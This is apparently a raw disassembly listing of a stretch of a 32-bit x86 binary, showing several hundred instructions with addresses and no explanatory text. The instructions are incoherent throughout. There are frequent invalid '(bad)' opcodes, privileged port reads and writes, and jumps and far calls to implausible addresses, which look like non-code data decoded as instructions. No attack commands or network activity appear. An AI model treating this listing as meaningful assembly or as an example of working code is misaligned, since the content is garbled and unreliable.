  40c603:	(bad)  
  40c604:	das    
  40c605:	jbe    0x40c593
  40c607:	push   edx
  40c608:	repz aaa 
  40c60a:	fnsave [ebx+edx*2-0x1a]
  40c60e:	or     ch,BYTE PTR [edx+0x52]
  40c611:	(bad)  
  40c613:	jmp    DWORD PTR [edi-0x5d]
  40c616:	adc    bl,BYTE PTR [edi-0x1530f5c8]
  40c61c:	lods   eax,DWORD PTR ds:[esi]
  40c61d:	dec    edx
  40c61e:	arpl   WORD PTR [ebx-0x2e31c003],bp
  40c624:	mov    ch,0x1c
  40c626:	or     DWORD PTR gs:[ebx+0x49],0x5
  40c62b:	stc    
  40c62c:	fist   DWORD PTR [edi-0x3b6b71ae]
  40c632:	iret   
  40c633:	sbb    ebx,DWORD PTR [edi-0x1a]
  40c636:	push   ebp
  40c637:	popf   
  40c638:	and    DWORD PTR [ebx-0x52],ebx
  40c63b:	sub    dh,BYTE PTR [esp+eax*1-0x2ba8ce17]
  40c642:	push   edi
  40c643:	mov    al,ds:0x12f9ad4b
  40c648:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c649:	cmp    al,0x19
  40c64b:	retf   
  40c64c:	addr16 (bad) 
  40c64e:	dec    edi
  40c64f:	pop    ecx
  40c650:	mov    ah,0x58
  40c652:	mov    cl,0x9b
  40c654:	xchg   esi,eax
  40c655:	push   eax
  40c656:	sub    bl,BYTE PTR [esi+ebx*8]
  40c659:	push   es
  40c65a:	bound  ebx,QWORD PTR [ebp+0x56]
  40c65d:	addr16 cmc 
  40c65f:	push   ecx
  40c660:	test   eax,0x130ff83c
  40c665:	xchg   esi,eax
  40c666:	repnz loop 0x40c66a
  40c669:	or     al,0xf
  40c66b:	mov    cl,0x8f
  40c66d:	inc    edi
  40c66e:	and    DWORD PTR [ecx-0x5946fdab],ebp
  40c674:	mov    edx,0xf7d93430
  40c679:	push   edx
  40c67a:	lar    eax,WORD PTR [edx-0x573798ff]
  40c681:	(bad)  
  40c682:	addr16 inc ebx
  40c684:	pushf  
  40c685:	pop    ss
  40c686:	add    eax,0xf3cd99ec
  40c68b:	xor    DWORD PTR [ecx],ebp
  40c68d:	xor    DWORD PTR [ecx+eiz*2],eax
  40c690:	push   edx
  40c691:	xor    eax,0xbeded0ef
  40c696:	addr16 mov cl,0xc0
  40c699:	pop    es
  40c69a:	shr    cl,1
  40c69c:	and    bl,BYTE PTR [ecx-0x49]
  40c69f:	out    dx,al
  40c6a0:	xor    al,0xd9
  40c6a2:	push   ds
  40c6a3:	and    eax,0x161efed7
  40c6a8:	ror    edi,cl
  40c6aa:	xchg   edx,eax
  40c6ab:	addr16 stc 
  40c6ad:	shl    DWORD PTR [esi-0x709fc230],cl
  40c6b3:	jl     0x40c657
  40c6b5:	fiadd  DWORD PTR [edi-0x3bc0da08]
  40c6bb:	pop    eax
  40c6bc:	lods   al,BYTE PTR ds:[esi]
  40c6bd:	xor    DWORD PTR [esi-0x68],eax
  40c6c0:	jne    0x40c702
  40c6c2:	inc    ebp
  40c6c3:	dec    eax
  40c6c4:	bound  eax,QWORD PTR [ecx]
  40c6c6:	sbb    eax,DWORD PTR [ecx+edx*8+0x171bc84c]
  40c6cd:	lea    edi,[eax+0x515a24e5]
  40c6d3:	inc    edi
  40c6d4:	shl    BYTE PTR [esi+0xc],0x50
  40c6d8:	mov    DWORD PTR [edx+0x44],esi
  40c6db:	push   edi
  40c6dc:	shl    BYTE PTR [ebx+edx*8+0x57d4ff59],0xa8
  40c6e4:	int3   
  40c6e5:	and    esi,edx
  40c6e7:	and    BYTE PTR [eax],ah
  40c6e9:	call   0x66e40fcd
  40c6ee:	jne    0x40c74b
  40c6f0:	push   eax
  40c6f1:	cvtdq2ps xmm3,xmm6
  40c6f4:	in     eax,0x2b
  40c6f6:	or     DWORD PTR [ecx+0x21],esp
  40c6f9:	arpl   WORD PTR [ebx+edx*4],bx
  40c6fc:	and    ecx,DWORD PTR [ebx+eax*1+0x7b]
  40c700:	inc    ebx
  40c701:	(bad)  
  40c702:	in     eax,0x71
  40c704:	call   0x2f84adb7
  40c709:	add    DWORD PTR [edx-0x4e2faf82],ebx
  40c70f:	popf   
  40c710:	jne    0x40c6b2
  40c712:	jnp    0x40c6fc
  40c714:	xchg   esi,eax
  40c715:	retf   
  40c716:	adc    BYTE PTR [esi-0x15],al
  40c719:	jge    0x40c72f
  40c71b:	test   DWORD PTR [edi+0x29],edi
  40c71e:	in     eax,0xf5
  40c720:	ds std 
  40c722:	mov    bl,0x41
  40c724:	inc    edx
  40c725:	cwde   
  40c726:	push   es
  40c727:	retf   0xa5b6
  40c72a:	sbb    ecx,DWORD PTR [eax]
  40c72c:	stos   BYTE PTR es:[edi],al
  40c72d:	jg     0x285c0d94
  40c733:	xor    DWORD PTR ds:0x58118c5c,esi
  40c739:	pop    ss
  40c73a:	inc    edx
  40c73b:	adc    bh,BYTE PTR [eax+edx*4+0x15]
  40c73f:	xchg   BYTE PTR [eax],cl
  40c741:	mov    ch,BYTE PTR [ebx-0x65c729a]
  40c747:	(bad)  
  40c748:	loop   0x40c723
  40c74a:	jmp    0x40c7b5
  40c74c:	js     0x40c7b3
  40c74e:	rol    DWORD PTR ss:[ebp+edx*4+0x691d79b1],cl
  40c756:	push   edi
  40c757:	int3   
  40c758:	fist   DWORD PTR [eax+ecx*2-0x2d]
  40c75c:	add    bh,BYTE PTR [ecx+ebx*2-0x48]
  40c760:	add    eax,edx
  40c762:	dec    edi
  40c763:	mov    esp,DWORD PTR [ebp-0x67]
  40c766:	push   edi
  40c767:	out    0xe5,al
  40c769:	stos   DWORD PTR es:[edi],eax
  40c76a:	jo     0x40c72f
  40c76c:	loope  0x40c7a6
  40c76e:	and    BYTE PTR ds:0xf2ab734f,ah
  40c774:	and    DWORD PTR [ebx+0x6f],0x7461c257
  40c77b:	rol    BYTE PTR [edi-0x51],0x6a
  40c77f:	gs pop ss
  40c781:	xchg   si,ax
  40c783:	mov    ebx,0xc93908ff
  40c788:	sub    eax,0xe982da1c
  40c78d:	out    dx,eax
  40c78e:	in     al,dx
  40c78f:	(bad)
  40c793:	mov    WORD PTR [edi+0x3de3a178],?
  40c799:	fimul  DWORD PTR [edi+eiz*4-0xa]
  40c79d:	mov    ebx,ebx
  40c79f:	retf   0x5735
  40c7a2:	cwde   
  40c7a3:	mov    ch,BYTE PTR [eax+0x7381b9f3]
  40c7a9:	push   ebx
  40c7aa:	aas    
  40c7ab:	idiv   DWORD PTR [ecx]
  40c7ad:	fistp  DWORD PTR [ebx+0x32]
  40c7b0:	out    dx,al
  40c7b1:	add    BYTE PTR [edi+eiz*2],cl
  40c7b4:	jo     0x40c7a5
  40c7b6:	outs   dx,BYTE PTR ds:[esi]
  40c7b7:	xchg   DWORD PTR [edi-0x73],ecx
  40c7ba:	test   BYTE PTR [edx-0x26c11996],ah
  40c7c0:	pop    es
  40c7c1:	std    
  40c7c2:	jp     0x40c82e
  40c7c4:	dec    ebx
  40c7c5:	mov    al,ds:0x78e2a93a
  40c7ca:	fisubr WORD PTR [eax]
  40c7cc:	fisttp QWORD PTR [ecx+0x47]
  40c7cf:	cdq    
  40c7d0:	or     al,0x5
  40c7d2:	not    al
  40c7d4:	mov    edx,edi
  40c7d6:	ins    BYTE PTR es:[edi],dx
  40c7d7:	sti    
  40c7d8:	mov    edi,0x7198d92c
  40c7dd:	lds    esp,FWORD PTR [edi]
  40c7df:	popf   
  40c7e0:	push   eax
  40c7e1:	repnz push 0x7604e14b
  40c7e7:	mov    ebp,0x83a9efb6
  40c7ec:	jno    0x40c778
  40c7ee:	push   edi
  40c7ef:	jecxz  0x40c7c7
  40c7f1:	and    esi,ebp
  40c7f3:	sbb    dh,BYTE PTR [eax]
  40c7f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7f6:	retfw  0x67d
  40c7fa:	lods   eax,DWORD PTR ds:[esi]
  40c7fb:	xor    ah,BYTE PTR [ebx-0x13]
  40c7fe:	addr16 daa 
  40c800:	nop
  40c801:	(bad)  
  40c802:	mov    ebx,0x39d1965f
  40c807:	or     ah,BYTE PTR [ebx+0x73]
  40c80a:	mov    dh,0xb3
  40c80c:	ret    
  40c80d:	or     ebx,ebx
  40c80f:	ss je  0x40c7a8
  40c812:	fdivp  st(7),st
  40c814:	aam    0x5e
  40c816:	mov    ah,0x3f
  40c818:	add    BYTE PTR [eax+0xe9d89df],bl
  40c81e:	repz add eax,0x3653467a
  40c824:	out    dx,al
  40c825:	pop    es
  40c826:	mov    edx,0xa5c05173
  40c82b:	mov    bl,0xc4
  40c82d:	pop    eax
  40c82e:	fdiv   QWORD PTR [edx]
  40c830:	add    eax,0xfb1c8e8b
  40c835:	and    BYTE PTR [edi],bh
  40c837:	test   BYTE PTR ds:0xfd72e840,dh
  40c83d:	adc    dh,bl
  40c83f:	mov    ah,0x75
  40c841:	enter  0x439,0x1c
  40c845:	(bad)  
  40c847:	inc    ebx
  40c848:	push   es
  40c849:	cli    
  40c84a:	dec    ecx
  40c84b:	(bad)  [eax-0x60]
  40c84e:	push   esi
  40c84f:	add    esi,DWORD PTR [ebp+esi*4-0x4089762e]
  40c856:	inc    ecx
  40c857:	pop    esi
  40c858:	sub    edi,DWORD PTR [eax-0x2c]
  40c85b:	lea    edi,[edi-0x70831671]
  40c861:	inc    ecx
  40c862:	or     ch,BYTE PTR [eax+0x12050dd6]
  40c868:	adc    ecx,edi
  40c86a:	mov    ebx,0x9140d7ad
  40c86f:	push   edi
  40c870:	daa    
  40c871:	scas   al,BYTE PTR es:[edi]
  40c872:	in     eax,dx
  40c873:	sub    ebx,edx
  40c875:	inc    edi
  40c876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c877:	or     BYTE PTR [esi],bl
  40c879:	arpl   WORD PTR [edi+0x24],cx
  40c87c:	ja     0x40c85f
  40c87e:	ins    DWORD PTR es:[edi],dx
  40c87f:	xor    DWORD PTR [edx+edi*8],eax
  40c882:	scas   eax,DWORD PTR es:[edi]
  40c883:	or     eax,0x5e842ba5
  40c888:	push   esi
  40c889:	sub    al,0x7b
  40c88b:	in     eax,0x62
  40c88d:	xor    edx,DWORD PTR ds:0xe7f317a5
  40c893:	call   0x996afc20
  40c898:	inc    eax
  40c89a:	sbb    edi,DWORD PTR [edx]
  40c89c:	dec    esp
  40c89d:	fild   DWORD PTR [esi+0xa1a835b]
  40c8a3:	pop    eax
  40c8a4:	push   ebp
  40c8a5:	sbb    ebx,0x67
  40c8a8:	aas    
  40c8a9:	jo     0x40c862
  40c8ab:	retf   
  40c8ac:	clc    
  40c8ad:	leave  
  40c8ae:	inc    edx
  40c8af:	fwait
  40c8b0:	sbb    bh,bl
  40c8b2:	push   0x4fcb7c5f
  40c8b7:	dec    ebp
  40c8b8:	push   ebx
  40c8b9:	cmp    edi,DWORD PTR [edx*8+0x65a865de]
  40c8c0:	lock inc edi
  40c8c2:	xchg   esp,eax
  40c8c3:	dec    ebx
  40c8c4:	mov    ds:0xaa260808,al
  40c8c9:	xchg   ecx,eax
  40c8ca:	push   ebx
  40c8cb:	cmp    ebp,esp
  40c8cd:	popf   
  40c8ce:	test   DWORD PTR [ebp+0x6cc50488],0x26d4d930
  40c8d8:	xchg   esp,eax
  40c8d9:	jle    0x40c91e
  40c8db:	out    0x52,eax
  40c8dd:	jns    0x40c941
  40c8df:	es pop esp
  40c8e1:	mov    WORD PTR [ebp-0x151f3a2a],gs
  40c8e7:	(bad)
  40c8eb:	jns    0x40c925
  40c8ed:	and    bl,BYTE PTR [edi+0x29]
  40c8f0:	cmp    ebp,DWORD PTR [edx*1+0x5625786d]
  40c8f7:	repz jge 0x40c94c
  40c8fa:	into   
  40c8fb:	jbe    0x40c96f
  40c8fd:	push   ecx
  40c8fe:	stos   DWORD PTR es:[edi],eax
  40c8ff:	mov    ebx,0x87bcca65
  40c904:	int    0xaa
  40c906:	fild   WORD PTR [eax-0x51cbd12e]
  40c90c:	jle    0x40c8d2
  40c90e:	repz iret 
  40c910:	loopne 0x40c898
  40c912:	sbb    BYTE PTR [eax],bh
  40c914:	(bad)  
  40c915:	or     BYTE PTR [ebp-0x21],al
  40c918:	int3   
  40c919:	mov    WORD PTR [ebx],?
  40c91b:	es pop esi
  40c91d:	xchg   esi,eax
  40c91f:	mov    BYTE PTR [ebx+0x2a],al
  40c922:	xor    DWORD PTR ds:0x68d6ebf6,ecx
  40c928:	jnp    0x40c8d0
  40c92a:	add    dh,al
  40c92c:	push   0x16c2bf19
  40c931:	loop   0x40c8b7
  40c933:	jmp    0x40c95d
  40c935:	iret   
  40c936:	mov    edx,0x87b76e72
  40c93b:	mov    ds:0x995e4acb,eax
  40c940:	mov    edi,0x9c4c2b45
  40c945:	push   ds
  40c946:	ss pop ebp
  40c948:	or     eax,0xf295947e
  40c94d:	cs out 0x5e,eax
  40c950:	add    al,0xb7
  40c952:	sbb    eax,0xfbfbfb63
  40c957:	imul   eax,ebp,0xffffff81
  40c95a:	xchg   esi,eax
  40c95b:	push   cs
  40c95c:	bound  edi,QWORD PTR [ecx-0x38]
  40c95f:	sbb    ebx,DWORD PTR [ebx+0x63]
  40c962:	pop    edx
  40c963:	hlt    
  40c964:	mov    ch,0x11
  40c966:	adc    eax,0xe8c64487
  40c96b:	dec    edi
  40c96c:	push   es
  40c96d:	data16 sti 
  40c96f:	xor    eax,0x69324e2e
  40c974:	cmp    ax,WORD PTR [ecx+esi*1-0x7e]
  40c979:	adc    cl,cl
  40c97b:	test   DWORD PTR [ebx],0xb993281e
  40c981:	arpl   WORD PTR [esi+ebx*2],dx
  40c984:	mov    al,ds:0xa3286be8
  40c989:	mov    dl,0xe4
  40c98b:	mov    dh,0xd0
  40c98d:	mov    BYTE PTR [esi-0x10ee1087],dl
  40c993:	pop    ds
  40c994:	xor    eax,0xba3a060c
  40c999:	fwait
  40c99a:	xlat   BYTE PTR ds:[ebx]
  40c99b:	adc    BYTE PTR [ebp-0x6e],dl
  40c99e:	adc    eax,0x654e32
  40c9a3:	out    dx,al
  40c9a4:	pop    ebp
  40c9a5:	rcl    BYTE PTR [si-0x4745],cl
  40c9aa:	pop    eax
  40c9ab:	jb     0x40c98f
  40c9ad:	add    BYTE PTR [edx+0x72],al
  40c9b0:	sub    al,0x3f
  40c9b2:	dec    ecx
  40c9b3:	push   eax
  40c9b4:	dec    esi
  40c9b5:	loope  0x40c9fe
  40c9b7:	imul   esi,DWORD PTR [edx+0x76c495d6],0xffffff8a
  40c9be:	add    DWORD PTR [ebx],0x60
  40c9c1:	inc    esi
  40c9c2:	xchg   esp,eax
  40c9c3:	jne    0x40c9e4
  40c9c5:	call   0x1681:0x7b873ef8
  40c9cc:	mov    esp,0xc6ec58a3
  40c9d1:	push   esi
  40c9d2:	sub    BYTE PTR ds:0x864d2c50,ch
  40c9d8:	inc    ebp
  40c9d9:	in     eax,dx
  40c9da:	xchg   esp,eax
  40c9db:	jmp    FWORD PTR [ebx]
  40c9dd:	mov    esp,0x59942983
  40c9e2:	ins    BYTE PTR es:[edi],dx
  40c9e3:	je     0x40c97e
  40c9e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9e6:	add    al,BYTE PTR [eax+0x6a690f75]
  40c9ec:	sbb    al,0x6f
  40c9ee:	sbb    al,0x68
  40c9f0:	and    ebp,DWORD PTR [ecx+0x7b]
  40c9f3:	sbb    dl,ch
  40c9f5:	stc    
  40c9f6:	imul   DWORD PTR [ebx+0x24]
  40c9f9:	cmp    BYTE PTR [edi+edi*8],cl
  40c9fc:	inc    esi
  40c9fd:	cdq    
  40c9fe:	mov    edi,0x5cda6c3d
  40ca03:	or     eax,0xe061f71b
  40ca08:	dec    ebx
  40ca09:	(bad)  
  40ca0a:	sub    ecx,DWORD PTR [ebx]
  40ca0c:	jecxz  0x40c9f6
  40ca0e:	in     al,0xa0
  40ca10:	popf   
  40ca11:	(bad)  
  40ca13:	jne    0x40ca71
  40ca15:	std    
  40ca16:	test   al,0x53
  40ca18:	pushf  
  40ca19:	and    ah,BYTE PTR [edi]
  40ca1b:	push   0xec8fcdb4
  40ca20:	mov    eax,ds:0x28a84fd7
  40ca25:	unpcklps xmm2,xmm3
  40ca28:	sub    DWORD PTR [ebx+0xa9a93a5],0x570352b8
  40ca32:	jns    0x40caaf
  40ca34:	in     eax,dx
  40ca35:	jnp    0x40ca92
  40ca37:	mov    DWORD PTR [edx],ecx
  40ca39:	ins    DWORD PTR es:[edi],dx
  40ca3a:	sub    ebp,esp
  40ca3c:	adc    al,0x3a
  40ca3e:	adc    bh,BYTE PTR [ebx]
  40ca40:	das    
  40ca41:	mov    esp,DWORD PTR [ebp-0x7b]
  40ca44:	(bad)  
  40ca47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca48:	(bad)  
  40ca49:	push   0x54
  40ca4b:	ror    BYTE PTR [ebp+0x23f519c7],cl
  40ca51:	adc    BYTE PTR [ebp-0x15],bh
  40ca54:	mov    edi,0xdf51babf
  40ca59:	cmp    eax,0x1c3d2a07
  40ca5e:	mov    al,ds:0xabcc3001
  40ca63:	jo     0x40caba
  40ca65:	and    bl,dh
  40ca67:	outs   dx,DWORD PTR ds:[esi]
  40ca68:	mov    ecx,0xfd58446b
  40ca6d:	pcmpgtb mm5,QWORD PTR [edi-0x45aa82c5]
  40ca74:	and    esp,esi
  40ca76:	jnp    0x40ca21
  40ca78:	hlt    
  40ca79:	repz inc edx
  40ca7b:	dec    ebx
  40ca7c:	push   ss
  40ca7d:	mov    ah,BYTE PTR [ebx-0x11]
  40ca80:	ds cs xchg ebx,eax
  40ca83:	jp     0x40ca9c
  40ca85:	push   edx
  40ca86:	add    DWORD PTR [ebx-0x58a1f9e8],ebp
  40ca8c:	mov    ebx,0x141b0317
  40ca91:	fsubrp st(0),st
  40ca93:	setp   bl
  40ca96:	stc    
  40ca97:	jbe    0x40ca32
  40ca99:	clc    
  40ca9a:	pop    ebp
  40ca9b:	jno    0x40ca3d
  40ca9d:	push   ecx
  40ca9e:	mov    edi,0xb1e7542a
  40caa3:	mov    ss,WORD PTR [esi-0x6a19ac7e]
  40caa9:	and    eax,0x474dea13
  40caae:	mov    ch,0x1d
  40cab0:	inc    edi
  40cab1:	div    BYTE PTR [edi+0x6246319d]
  40cab7:	push   eax
  40cab8:	leave  
  40cab9:	jnp    0x40cb27
  40cabb:	sbb    eax,0x36699f00
  40cac0:	mov    al,0x67
  40cac2:	(bad)  
  40cac3:	xor    al,0x83
  40cac5:	sbb    DWORD PTR [esi],eax
  40cac7:	shl    ah,0xc6
  40caca:	nop
  40cacb:	mov    dh,0x7f
  40cacd:	cmp    DWORD PTR [eax+0x73f39ec6],ecx
  40cad3:	cmp    eax,0x669b3069
  40cad8:	mov    ebp,0xf443ece1
  40cadd:	add    ah,BYTE PTR [edx-0x7efbe58c]
  40cae3:	mov    ch,0x3b
  40cae5:	or     esp,DWORD PTR fs:[ebp+esi*4+0x24]
  40caea:	xor    BYTE PTR [esi-0x3],bh
  40caed:	fistp  WORD PTR [edx-0x1448f84c]
  40caf3:	sar    DWORD PTR [edi+0x1cef229b],cl
  40caf9:	dec    ebp
  40cafa:	inc    ecx
  40cafb:	adc    ebx,edx
  40cafd:	or     eax,DWORD PTR [ebx+0x39b1b227]
  40cb03:	cdq    
  40cb04:	mov    DWORD PTR [ebp-0x61efb5dc],ebx
  40cb0a:	mov    eax,0x71dfbcf2
  40cb0f:	add    ebx,ecx
  40cb11:	cmp    DWORD PTR [edx],edx
  40cb13:	xchg   esi,eax
  40cb14:	or     ah,BYTE PTR [esi+0x644ce5ca]
  40cb1a:	cmp    ebp,edi
  40cb1c:	fild   DWORD PTR [ecx-0x367299b5]
  40cb22:	mov    DWORD PTR [eax+0x347c4e6c],eax
  40cb28:	lahf   
  40cb29:	hlt    
  40cb2a:	push   ebp
  40cb2b:	push   0x2d
  40cb2d:	retf   
  40cb2e:	std    
  40cb2f:	retf   0x3c7b
  40cb32:	sub    bh,BYTE PTR [esi+ebx*1+0x32b68814]
  40cb39:	les    edi,FWORD PTR [ecx-0x79]
  40cb3c:	push   edi
  40cb3d:	enter  0x7fad,0xf9
  40cb41:	and    BYTE PTR [edx-0x82dc2d1],al
  40cb47:	stc    
  40cb48:	pop    esp
  40cb49:	mov    DWORD PTR [eax-0xf9cf80a],edx
  40cb4f:	jmp    0x44df038d
  40cb54:	js     0x40cad9
  40cb56:	xchg   DWORD PTR [ebp+0x7b1b9639],edi
  40cb5c:	adc    BYTE PTR ds:0x3d345038,dh
  40cb62:	jbe    0x40cbd0
  40cb64:	and    al,0x7
  40cb66:	mov    esp,0x5c3e6369
  40cb6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb6c:	pop    ebp
  40cb6d:	fndisi(8087 only) 
  40cb6f:	mov    esi,0x17fe48fd
  40cb74:	int3   
  40cb75:	sar    bl,0x4d
  40cb78:	sub    edi,DWORD PTR [esi-0x26]
  40cb7b:	sbb    eax,0x93631faf
  40cb80:	pusha  
  40cb81:	push   esi
  40cb82:	mov    edi,0x4fa1df2d
  40cb87:	adc    BYTE PTR [ecx+0x37],ah
  40cb8a:	addr16 or al,0x30
  40cb8d:	repz hlt 
  40cb8f:	addr16 inc ecx
  40cb91:	mov    eax,0x36f86b3f
  40cb96:	jns    0x40cb7e
  40cb98:	lods   al,BYTE PTR ds:[esi]
  40cb99:	in     eax,0x3b
  40cb9b:	or     DWORD PTR [edi+eax*8+0x14de6bbb],ebx
  40cba2:	push   ebp
  40cba3:	push   cs
  40cba4:	lods   al,BYTE PTR ds:[esi]
  40cba5:	aas    
  40cba6:	sbb    eax,0xc769b973
  40cbab:	sub    bl,bh
  40cbad:	adc    dh,cl
  40cbaf:	adc    eax,0x68f088eb
  40cbb4:	push   cs
  40cbb5:	sub    DWORD PTR [esi+0x7d786c72],ebx
  40cbbb:	fadd   QWORD PTR [edi+0x11]
  40cbbe:	jbe    0x40cbf6
  40cbc0:	into   
  40cbc1:	inc    ebp
  40cbc2:	jnp    0x40cbe0
  40cbc4:	ins    BYTE PTR es:[edi],dx
  40cbc5:	xchg   DWORD PTR [esi],esp
  40cbc7:	cdq    
  40cbc8:	clc    
  40cbc9:	ja     0x40cc0d
  40cbcb:	xchg   esp,eax
  40cbcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbcd:	enter  0x606b,0xe9
  40cbd1:	inc    edx
  40cbd2:	xlat   BYTE PTR ds:[ebx]
  40cbd3:	in     al,dx
  40cbd4:	sub    al,0x7f
  40cbd6:	adc    al,0x1a
  40cbd8:	ja     0x40cbb0
  40cbda:	xor    ebx,ecx
  40cbdc:	add    al,0x70
  40cbde:	mov    esp,0x5f51167e
  40cbe3:	retf   
  40cbe4:	cmp    bl,BYTE PTR [edx+0x6a]
  40cbe7:	fdivr  DWORD PTR [edx-0x159e1832]
  40cbed:	xor    bh,BYTE PTR [ebp-0x74]
  40cbf0:	pop    ebp
  40cbf1:	popa   
  40cbf2:	repnz imul eax,DWORD PTR [esp+edi*2],0xffffff97
  40cbf7:	or     dl,bh
  40cbf9:	lds    edi,FWORD PTR [eax]
  40cbfb:	daa    
  40cbfc:	not    dh
  40cbfe:	push   ss
  40cbff:	popa   
  40cc00:	cmp    ebx,DWORD PTR [ebx+0x36]
  40cc03:	dec    esp
  40cc04:	ds cdq 
  40cc06:	mov    ebx,0xd3b95ba8
  40cc0b:	sub    al,0xf6
  40cc0d:	out    0xf7,eax
  40cc0f:	sahf   
  40cc10:	gs (bad) 
  40cc12:	out    0x5a,al
  40cc14:	aam    0x5f
  40cc16:	pop    ds
  40cc17:	pop    eax
  40cc18:	sub    al,0xcf
  40cc1a:	xchg   edx,eax
  40cc1b:	inc    ebp
  40cc1c:	les    ebx,FWORD PTR [edi]
  40cc1e:	sahf   
  40cc1f:	push   0x37
  40cc21:	mov    dh,0x2
  40cc23:	jp     0x40cc8c
  40cc25:	dec    esp
  40cc26:	ret    
  40cc27:	hlt    
  40cc28:	bound  esp,QWORD PTR [ebx]
  40cc2a:	pop    esi
  40cc2b:	mov    ebp,0x58ac9484
  40cc30:	xchg   edx,eax
  40cc31:	mov    cl,0xee
  40cc33:	vpsrld xmm1,xmm6,0xe1
  40cc38:	imul   ebx,ebx,0xffffffc7
  40cc3b:	or     eax,0x189e02a4
  40cc40:	fmul   st,st(1)
  40cc42:	xor    DWORD PTR [esi+0x74],0xae9e66c7
  40cc49:	outs   dx,DWORD PTR ds:[esi]
  40cc4a:	sbb    esp,esi
  40cc4c:	shl    DWORD PTR [edx+0x52],1
  40cc4f:	and    al,0xf9
  40cc51:	push   ecx
  40cc52:	daa    
  40cc53:	fwait
  40cc54:	ret    
  40cc55:	icebp  
  40cc56:	sub    BYTE PTR [edi],dl
  40cc58:	push   ebp
  40cc59:	mov    esi,0x34278c1c
  40cc5e:	gs in  al,dx
  40cc60:	sbb    BYTE PTR [eax],dl
  40cc62:	ins    BYTE PTR es:[edi],dx
  40cc63:	shr    BYTE PTR [ebx+0x4ad32747],0xf7
  40cc6a:	arpl   WORD PTR [esi],cx
  40cc6c:	add    al,0x34
  40cc6e:	xor    dh,BYTE PTR [eax-0x41d159e8]
  40cc74:	mov    esp,DWORD PTR [eax-0x3b1a82a2]
  40cc7a:	and    bh,cl
  40cc7c:	dec    ebp
  40cc7d:	dec    esp
  40cc7e:	cwde   
  40cc7f:	jmp    0x40ccb2
  40cc81:	nop
  40cc82:	int    0x77
  40cc84:	fwait
  40cc85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc86:	jae    0x40cc73
  40cc88:	and    DWORD PTR [ecx+esi*8],edx
  40cc8b:	fist   WORD PTR [edx]
  40cc8d:	inc    edx
  40cc8e:	xor    al,0x2c
  40cc90:	sbb    eax,0xf94261e7
	...
  40cd11:	add    BYTE PTR [eax],al
  40cd13:	add    BYTE PTR ds:0xf69202c1,dh
  40cd19:	shl    DWORD PTR [ebp+0x29d829e7],cl
  40cd1f:	scas   eax,DWORD PTR es:[edi]
  40cd20:	push   es
  40cd21:	pop    eax
  40cd22:	in     al,0xd2
  40cd24:	pop    esp
  40cd25:	jl     0x40cd27
  40cd27:	add    BYTE PTR [ecx+0x7],ch
  40cd2a:	add    BYTE PTR [eax],al
  40cd2c:	sub    BYTE PTR [esi],dh
  40cd2e:	data16 ror BYTE PTR [ecx],0x99
  40cd32:	and    BYTE PTR [ebx-0x50],ah
  40cd35:	cmp    esi,DWORD PTR [esi+0x8]
  40cd38:	adc    DWORD PTR [eax+0x6c],esp
  40cd3b:	dec    edx
  40cd3c:	in     eax,0x7a
  40cd3e:	adc    dh,cl
  40cd40:	mov    ecx,0x5704fef6
  40cd45:	and    eax,0xa1d7f236
  40cd4a:	(bad)  
  40cd4b:	fst    QWORD PTR [eax+0x56c09bcf]
  40cd51:	or     esp,DWORD PTR [ebx+0x2fe81715]
  40cd57:	sbb    esp,DWORD PTR [ecx+0x58]
  40cd5a:	scas   eax,DWORD PTR es:[edi]
  40cd5b:	fdiv   st(4),st
  40cd5d:	cmp    eax,0xaccafdf8
  40cd62:	lock mov ebx,0xc3a9ff76
  40cd68:	pop    ebx
  40cd69:	push   eax
  40cd6a:	inc    ecx
  40cd6b:	lds    eax,FWORD PTR [esi]
  40cd6d:	in     al,0xee
  40cd6f:	sub    bl,BYTE PTR [esi-0x4c]
  40cd72:	jnp    0x40cd9f
  40cd74:	rcl    DWORD PTR es:[eax+0x63],1
  40cd78:	dec    esp
  40cd79:	inc    eax
  40cd7a:	mov    edi,0xca6a3666
  40cd7f:	push   eax
  40cd80:	retf   
  40cd81:	div    DWORD PTR [eax+ebp*2-0x2b]
  40cd85:	cmp    al,bl
  40cd87:	dec    esi
  40cd88:	cld    
  40cd89:	sti    
  40cd8a:	pop    esp
  40cd8b:	pop    ecx
  40cd8c:	shl    BYTE PTR [esi],cl
  40cd8e:	mov    edx,0xd7b15e95
  40cd93:	mov    DWORD PTR [edi-0x61],ebp
  40cd96:	test   BYTE PTR [esi+eax*8-0x43],dl
  40cd9a:	pop    ss
  40cd9b:	jbe    0x40cdea
  40cd9d:	(bad)  
  40cd9e:	and    BYTE PTR [eax-0x6ad73900],ch
  40cda4:	push   ebp
  40cda5:	cmc    
  40cda6:	push   ecx
  40cda7:	add    BYTE PTR ds:0x9c9d808e,dh
  40cdad:	out    dx,eax
  40cdae:	fiadd  DWORD PTR [edi+0x1]
  40cdb1:	cmp    al,0x4d
  40cdb3:	in     al,dx
  40cdb4:	lea    ebx,[ebx]
  40cdb6:	jmp    0x40cd7d
  40cdb8:	jmp    0x86fd83b5
  40cdbd:	bound  eax,QWORD PTR [edi+edi*2-0x678db062]
  40cdc4:	jmp    0x116eb718
  40cdc9:	add    dh,cl
  40cdcb:	sub    eax,0x19555ee7
  40cdd0:	fdivr  QWORD PTR [ecx]
  40cdd2:	push   ds
  40cdd3:	lds    ebx,FWORD PTR [ecx]
  40cdd5:	mov    ds:0x73aa733a,al
  40cdda:	test   DWORD PTR [ebp-0x60f7c6e0],ecx
  40cde0:	cld    
  40cde1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cde2:	cmp    al,0xf5
  40cde4:	in     eax,0x84
  40cde6:	scas   al,BYTE PTR es:[edi]
  40cde7:	fcmovnbe st,st(3)
  40cde9:	dec    ecx
  40cdea:	jns    0x40cd85
  40cdec:	xor    eax,0x40290a1e
  40cdf1:	outs   dx,BYTE PTR ds:[esi]
  40cdf2:	mov    eax,0xcf020296
  40cdf7:	jg     0x40ce04
  40cdf9:	jg     0x40cda3
  40cdfb:	mov    bh,BYTE PTR [ebp-0x7dd7de37]
  40ce01:	sbb    BYTE PTR ds:0xb42356e1,dl
